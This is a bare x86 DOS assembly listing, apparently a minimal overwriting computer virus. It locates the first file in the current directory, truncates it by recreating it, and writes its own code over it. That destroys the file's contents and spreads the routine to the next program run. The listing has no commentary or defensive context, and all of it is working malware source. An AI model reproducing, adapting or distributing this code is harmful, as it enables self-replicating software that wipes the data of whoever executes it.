Main:           Lea Dx,FileSpec
                Mov Ah,4eh
                Int 21h
                Mov Dx,9eh
                Mov Ah,3ch
                Int 21h
                Lea Dx,Main
                Mov Bh,40h
                Mov Cl,Length
                Xchg Ax,Bx
                Int 21h
FileSpec        Db '*.*',0
Length          Equ $-Main
